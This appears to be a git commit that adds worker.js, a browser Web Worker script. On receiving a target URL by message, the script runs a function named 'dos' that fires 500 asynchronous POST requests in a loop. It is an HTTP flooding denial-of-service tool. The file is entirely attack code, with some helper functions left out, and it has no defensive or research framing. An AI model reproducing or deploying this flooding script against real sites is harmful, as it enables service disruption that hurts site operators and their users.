a2fe37352f36a0f4470c0cf8a0f6f6b549c76288
h5mcbox <33593244+h5mcbox@users.noreply.github.com>
2019-12-04 18:21:43 +0800

    Create worker.js

---
+++ worker.js
@@ -0,0 +1,21 @@
+// ...
+function makeRequest () {
+    //make a new URL and request it via POST
+    var fullUrl=makeUrl();
+    var httpRequest= new XMLHttpRequest();
+    httpRequest.open("POST", fullUrl, true);
+    httpRequest.setRequestHeader("Content-Type", "text/plain; charset=uft-8");
+    httpRequest.onreadystatechange=infoReceived;
+    httpRequest.onerror=err;
+    httpRequest.send(post_data);
+}
+function dos(){
+    var i=0;
+    for(i=0;i<500;i++){
+        makeRequest();
+     }
+}
+self.onmessage=function(e){
+    base = e.data;
+    dos();
+}
